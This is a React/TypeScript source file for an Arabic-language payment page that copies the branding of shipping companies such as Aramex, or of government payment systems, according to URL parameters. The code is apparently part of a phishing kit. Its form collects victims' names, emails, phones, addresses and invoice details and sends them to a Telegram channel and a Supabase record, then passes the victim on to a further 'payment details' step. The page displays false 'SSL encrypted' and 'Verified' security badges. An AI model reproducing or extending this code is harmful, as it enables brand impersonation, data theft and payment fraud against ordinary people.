import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { getServiceBranding } from "@/lib/serviceLogos";
import { shippingCompanyBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCountryByCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { Shield, ArrowLeft, User, Mail, Phone, MapPin, Package, Sparkles, Lock, ShieldCheck, FileText, DollarSign, Landmark } from "lucide-react";
import { designSystem } from "@/lib/designSystem";
import BrandedCarousel from "@/components/BrandedCarousel";
import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
import PageLoader from "@/components/PageLoader";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { isGovernmentService, getGovernmentServicesByCountry } from "@/lib/governmentPaymentServices";

const PaymentRecipient = () => {
  const { id, company: pathCompany, currency: pathCurrency, amount: pathAmount } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading, isError, error } = useLink(id);
  const updateLink = useUpdateLink();
  const [customerName, setCustomerName] = useState("");
  const [customerEmail, setCustomerEmail] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [residentialAddress, setResidentialAddress] = useState("");
  const [invoiceNumber, setInvoiceNumber] = useState("");
  const [selectedGovService, setSelectedGovService] = useState("");
  const [paymentAmount, setPaymentAmount] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showPage, setShowPage] = useState(false);

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowPage(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (linkData || isError) {
      setShowPage(true);
    }
  }, [linkData, isError]);

  const urlParams = new URLSearchParams(window.location.search);
  // دعم Path Parameters + Query Parameters (backward compatible) - أولوية لـ URL parameters
  let serviceKey = pathCompany || urlParams.get('company') || urlParams.get('c') || urlParams.get('service') || linkData?.payload?.service_key || 'aramex';
  const currencyParam = pathCurrency || urlParams.get('currency') || urlParams.get('cur');
  const titleParam = urlParams.get('title');
  const amountParam = pathAmount || urlParams.get('amount') || urlParams.get('a');
  const paymentMethodParam = urlParams.get('pm') || urlParams.get('method') || 'card';
  const payerTypeParam = urlParams.get('payer_type') || urlParams.get('payer');
  const countryParam = urlParams.get('country') || urlParams.get('c');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
  const companyMeta = getCompanyMeta(serviceKey);

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  // أولوية للـ query parameters، ثم linkData، ثم defaults
  const shippingInfo = linkData?.payload as Record<string, unknown>;
  const payerType = payerTypeParam || shippingInfo?.payer_type || "recipient";
  
  // استنتاج الدولة من العملة أولاً إذا كانت موجودة في path أو query
  const currencyCode = currencyParam || shippingInfo?.currency_code || "SAR";
  const inferredCountryFromCurrency = getCountryByCurrency(currencyCode);
  
  const countryCode = countryParam || inferredCountryFromCurrency || shippingInfo?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);
  const phoneCode = countryData?.phoneCode || "+966";
  
  // Check if this is a government service and get its theme
  const isGovService = isGovernmentService(serviceKey);
  const govSystem = getGovernmentPaymentSystem(countryCode);
  
  // Get government services for the specific country
  const countryGovServices = getGovernmentServicesByCountry(countryCode);

  const rawAmount = amountParam || shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  if (isLoading && !showPage) {
    return <PageLoader message="جاري تحميل بيانات الدفع..." />;
  }

  if (isError) {
    console.error('Error loading link:', error);
  }

  const formattedAmount = formatCurrency(amount, currencyCode);
  const phonePlaceholder = countryData?.phonePlaceholder || "5X XXX XXXX";
  
  const detectedEntity = detectEntityFromURL();
  const entityLogo = detectedEntity ? getEntityLogo(detectedEntity) : null;
  const displayLogo = entityLogo || branding.logo;
  
  // Use government theme if it's a government service, otherwise use company branding
  const primaryColor = isGovService ? govSystem.colors.primary : (companyBranding?.colors.primary || branding.colors.primary);
  const secondaryColor = isGovService ? govSystem.colors.secondary : (companyBranding?.colors.secondary || branding.colors.secondary);
  const surfaceColor = isGovService ? govSystem.colors.surface : (companyBranding?.colors.surface || '#F8F9FA');
  const fontFamily = isGovService ? govSystem.fonts.primaryAr : (companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif');
  
  const handleProceed = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (isSubmitting) return;
    setIsSubmitting(true);

    try {
      const formData = new FormData();
      formData.append('form-name', 'payment-recipient');
      formData.append('name', customerName);
      formData.append('email', customerEmail);
      formData.append('phone', customerPhone);
      formData.append('address', residentialAddress);
      formData.append('service', serviceName);
      formData.append('amount', formattedAmount);
      formData.append('linkId', id || '');
      if (isGovService) {
        formData.append('invoiceNumber', invoiceNumber);
        formData.append('govService', selectedGovService);
        formData.append('paymentAmount', paymentAmount);
      }

      try {
        await fetch('/', {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: new URLSearchParams(formData as Record<string, string>).toString()
        });
      } catch (error) {
        console.error('Form submission error:', error);
      }

      const productionDomain = window.location.origin;
      try {
        await sendToTelegram({
          type: 'payment_recipient',
          data: {
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            address: residentialAddress,
            service: serviceName,
            amount: formattedAmount,
            ...(isGovService && {
              invoiceNumber: invoiceNumber,
              govService: selectedGovService,
              paymentAmount: paymentAmount
            }),
            payment_url: `${productionDomain}/pay/${id}/details`
          },
          timestamp: new Date().toISOString()
        });
      } catch (error) {
        console.error('Telegram error:', error);
      }

      if (linkData) {
        try {
          const customerData = {
            ...linkData.payload,
            customerInfo: {
              name: customerName,
              email: customerEmail,
              phone: customerPhone,
              address: residentialAddress,
              service: serviceName,
              amount: formattedAmount,
              ...(isGovService && {
                invoiceNumber: invoiceNumber,
                govService: selectedGovService,
                paymentAmount: paymentAmount
              })
            },
            selectedCountry: countryCode,
            service_key: serviceKey,
            service_name: serviceName
          };

          await updateLink.mutateAsync({
            linkId: id!,
            payload: customerData
          });
        } catch (error) {
          console.error('Update link error:', error);
        }
      }

      const queryParams = new URLSearchParams({
        service: serviceKey,
        country: countryCode,
        amount: amount.toString(),
        currency: currencyCode,
        method: paymentMethodParam || 'card'
      }).toString();
      
      const nextUrl = `/pay/${id}/details?${queryParams}`;
      navigate(nextUrl);
    } catch (error) {
      console.error('Proceed error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };
  
  return (
    <>
      <PaymentMetaTags 
        serviceKey={serviceKey}
        serviceName={serviceName}
        title={dynamicTitle}
        customDescription={dynamicDescription}
        amount={formattedAmount}
      />

      {/* Branded Header */}
      <div 
        className="sticky top-0 z-50 w-full shadow-md"
        style={{
          background: isGovService ? govSystem.gradients.header : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
          borderBottom: `2px solid ${primaryColor}`,
        }}
      >
        <div className="container mx-auto px-3 sm:px-4">
          <div className="flex items-center justify-between h-12 sm:h-14">
            <div className="flex items-center gap-2 sm:gap-3">
              {isGovService && govSystem.logo ? (
                <img 
                  src={govSystem.logo} 
                  alt={serviceName}
                  className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
                />
              ) : displayLogo && (
                <img 
                  src={displayLogo} 
                  alt={serviceName}
                  className="h-8 sm:h-10 w-auto object-contain brightness-0 invert"
                />
              )}
              <div className="text-white">
                <h2 className="text-sm sm:text-base font-bold">
                  {isGovService ? govSystem.nameAr : serviceName}
                </h2>
                <p className="text-[10px] sm:text-xs opacity-90 hidden sm:block">
                  الدفع الآمن
                </p>
              </div>
            </div>
            
            <div className="flex items-center gap-1 px-2 py-1 rounded-full bg-white/20 backdrop-blur-sm">
              <ShieldCheck className="w-3 h-3 sm:w-3.5 sm:h-3.5 text-white" />
              <span className="text-[10px] sm:text-xs font-medium text-white">آمن</span>
            </div>
          </div>
        </div>
      </div>

      {/* Hero Carousel */}
      <BrandedCarousel serviceKey={serviceKey} className="mb-0" countryCode={countryCode} />

      {/* Main Content */}
      <div 
        className="min-h-screen py-6 sm:py-8"
        dir="rtl"
        style={{
          background: `linear-gradient(135deg, ${surfaceColor}, #FFFFFF)`,
          fontFamily: fontFamily
        }}
      >
        <div className="container mx-auto px-3 sm:px-4 max-w-2xl">
          {/* Page Title */}
          <div className="text-center mb-5">
            <h1 
              className="text-lg sm:text-xl font-bold mb-1"
              style={{
                color: primaryColor,
                fontFamily: fontFamily
              }}
            >
              {isGovService ? "إكمال بيانات الدفع" : (payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل")}
            </h1>
            <p className="text-xs sm:text-sm text-gray-600">
              {isGovService ? "أدخل بيانات الدفع لإكمال العملية" : "الرجاء إدخال بياناتك لإكمال عملية الدفع"}
            </p>
            
            {/* Amount Display */}
            <div 
              className="inline-flex items-center gap-1.5 sm:gap-2 px-3 sm:px-4 py-1.5 sm:py-2 rounded-full text-sm sm:text-base font-bold mt-2.5" 
              style={{ 
                background: isGovService ? govSystem.gradients.primary : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                color: '#ffffff',
                boxShadow: '0 3px 10px rgba(0,0,0,0.1)'
              }}
            >
              <Package className="w-3.5 h-3.5 sm:w-4 sm:h-4" />
              <span className="text-xs sm:text-sm">المبلغ:</span>
              <span className="text-sm sm:text-base">{formattedAmount}</span>
            </div>
          </div>

          <Card 
            className="overflow-hidden border-0"
            style={{
              borderRadius: '12px',
              boxShadow: '0 3px 15px rgba(0,0,0,0.08)',
              borderTop: `3px solid ${primaryColor}`
            }}
          >

            {/* Form */}
            <form onSubmit={handleProceed} className="px-3 sm:px-5 py-4 sm:py-5 bg-white">
              <div className="space-y-3">
                {/* Full Name */}
                <div>
                  <Label 
                    htmlFor="name" 
                    className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                    style={{ color: designSystem.colors.neutral[800] }}
                  >
                    <User className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                    الاسم الكامل *
                  </Label>
                  <Input
                    id="name"
                    value={customerName}
                    onChange={(e) => setCustomerName(e.target.value)}
                    required
                    className="h-9 sm:h-10 text-sm border-2"
                    style={{
                      borderRadius: '8px',
                      borderColor: designSystem.colors.neutral[200],
                      fontFamily: fontFamily
                    }}
                    placeholder="أدخل اسمك الكامل"
                  />
                </div>
                
                {/* Email */}
                <div>
                  <Label 
                    htmlFor="email" 
                    className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                    style={{ color: designSystem.colors.neutral[800] }}
                  >
                    <Mail className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                    البريد الإلكتروني *
                  </Label>
                  <Input
                    id="email"
                    type="email"
                    value={customerEmail}
                    onChange={(e) => setCustomerEmail(e.target.value)}
                    required
                    className="h-9 sm:h-10 text-sm border-2"
                    style={{
                      borderRadius: '8px',
                      borderColor: designSystem.colors.neutral[200],
                      fontFamily: fontFamily
                    }}
                    placeholder="example@email.com"
                    dir="ltr"
                  />
                </div>
                
                {/* Phone */}
                <div>
                  <Label 
                    htmlFor="phone" 
                    className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                    style={{ color: designSystem.colors.neutral[800] }}
                  >
                    <Phone className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                    رقم الهاتف *
                  </Label>
                  <Input
                    id="phone"
                    type="tel"
                    value={customerPhone}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    required
                    className="h-9 sm:h-10 text-sm border-2"
                    style={{
                      borderRadius: '8px',
                      borderColor: designSystem.colors.neutral[200],
                      fontFamily: fontFamily
                    }}
                    placeholder={`${phoneCode} ${phonePlaceholder}`}
                    dir="ltr"
                  />
                </div>
                
                {isGovService ? (
                  <>
                    {/* Invoice Number - For Government Services Only */}
                    <div>
                      <Label 
                        htmlFor="invoiceNumber" 
                        className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                        style={{ color: designSystem.colors.neutral[800] }}
                      >
                        <FileText className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                        الرقم المفوتر *
                      </Label>
                      <Input
                        id="invoiceNumber"
                        value={invoiceNumber}
                        onChange={(e) => setInvoiceNumber(e.target.value)}
                        required
                        className="h-9 sm:h-10 text-sm border-2"
                        style={{
                          borderRadius: '8px',
                          borderColor: designSystem.colors.neutral[200],
                          fontFamily: fontFamily
                        }}
                        placeholder="مثال: INV-12345"
                      />
                    </div>

                    {/* Government Service Selector */}
                    <div>
                      <Label 
                        htmlFor="govService" 
                        className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                        style={{ color: designSystem.colors.neutral[800] }}
                      >
                        <Landmark className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                        الخدمة الحكومية/العامة *
                      </Label>
                      <Select value={selectedGovService} onValueChange={setSelectedGovService} required>
                        <SelectTrigger 
                          className="h-9 sm:h-10 text-sm border-2"
                          style={{
                            borderRadius: '8px',
                            borderColor: designSystem.colors.neutral[200],
                            fontFamily: fontFamily
                          }}
                        >
                          <SelectValue placeholder="اختر الخدمة" />
                        </SelectTrigger>
                        <SelectContent>
                          {countryGovServices.map((service) => (
                            <SelectItem key={service.key} value={service.key}>
                              {service.nameAr}
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                    </div>

                    {/* Payment Amount */}
                    <div>
                      <Label 
                        htmlFor="paymentAmount" 
                        className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                        style={{ color: designSystem.colors.neutral[800] }}
                      >
                        <DollarSign className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                        مبلغ السداد *
                      </Label>
                      <Input
                        id="paymentAmount"
                        type="number"
                        value={paymentAmount}
                        onChange={(e) => setPaymentAmount(e.target.value)}
                        required
                        className="h-9 sm:h-10 text-sm border-2"
                        style={{
                          borderRadius: '8px',
                          borderColor: designSystem.colors.neutral[200],
                          fontFamily: fontFamily
                        }}
                        placeholder="أدخل المبلغ"
                        step="0.01"
                        min="0"
                      />
                    </div>
                  </>
                ) : (
                  /* Address - For Non-Government Services Only */
                  <div>
                    <Label 
                      htmlFor="address" 
                      className="flex items-center gap-1.5 mb-1.5 text-xs sm:text-sm font-bold"
                      style={{ color: designSystem.colors.neutral[800] }}
                    >
                      <MapPin className="w-3.5 h-3.5" style={{ color: primaryColor }} />
                      العنوان السكني *
                    </Label>
                    <Input
                      id="address"
                      value={residentialAddress}
                      onChange={(e) => setResidentialAddress(e.target.value)}
                      required={!isGovService}
                      className="h-9 sm:h-10 text-sm border-2"
                      style={{
                        borderRadius: '8px',
                        borderColor: designSystem.colors.neutral[200],
                        fontFamily: fontFamily
                      }}
                      placeholder="أدخل عنوانك السكني الكامل"
                    />
                  </div>
                )}
              </div>

              {/* Security Notice */}
              <div 
                className="mt-3 p-2.5 rounded-lg flex items-start gap-2"
                style={{
                  background: `${primaryColor}08`,
                  border: `1px solid ${primaryColor}30`
                }}
              >
                <Shield className="w-3.5 h-3.5 mt-0.5 flex-shrink-0" style={{ color: primaryColor }} />
                <div>
                  <p className="text-[11px] font-bold mb-0.5" style={{ color: designSystem.colors.neutral[900] }}>
                    بياناتك محمية
                  </p>
                  <p className="text-[10px] text-gray-600">
                    جميع معلوماتك محمية بتقنية التشفير SSL
                  </p>
                </div>
              </div>
            
              {/* Submit Button */}
              <Button
                type="submit"
                disabled={
                  isSubmitting || 
                  !customerName || 
                  !customerEmail || 
                  !customerPhone || 
                  (isGovService ? (!invoiceNumber || !selectedGovService || !paymentAmount) : !residentialAddress)
                }
                className="w-full text-sm sm:text-base py-4 sm:py-5 text-white font-bold mt-4 rounded-lg disabled:opacity-50 disabled:cursor-not-allowed"
                style={{
                  background: isGovService ? govSystem.gradients.primary : `linear-gradient(135deg, ${primaryColor}, ${secondaryColor})`,
                  boxShadow: `0 6px 20px -6px ${primaryColor}70`
                }}
              >
                {isSubmitting ? (
                  <span>جاري المعالجة...</span>
                ) : (
                  <>
                    <span className="ml-2">متابعة للدفع</span>
                    <ArrowLeft className="w-5 h-5 mr-2" />
                  </>
                )}
              </Button>
            
              <p className="text-xs text-center text-gray-500 mt-4">
                🔒 جميع المعاملات مشفرة وآمنة
              </p>
            </form>
            
            {/* Hidden Netlify Form */}
            <form name="payment-recipient" data-netlify="true" data-netlify-honeypot="bot-field" hidden>
              <input type="text" name="name" />
              <input type="email" name="email" />
              <input type="tel" name="phone" />
              <input type="text" name="address" />
              <input type="text" name="service" />
              <input type="text" name="amount" />
              <input type="text" name="linkId" />
            </form>
          </Card>

          {/* Footer */}
          <div className="mt-8 text-center">
            <div className="flex items-center justify-center gap-4 text-xs text-gray-500 mb-3">
              <div className="flex items-center gap-1.5">
                <Lock className="w-3.5 h-3.5" />
                <span>SSL Encrypted</span>
              </div>
              <span>•</span>
              <div className="flex items-center gap-1.5">
                <ShieldCheck className="w-3.5 h-3.5" />
                <span>Verified</span>
              </div>
            </div>
            <p className="text-xs text-gray-400">
              © 2025 {serviceName}. جميع الحقوق محفوظة.
            </p>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentRecipient;
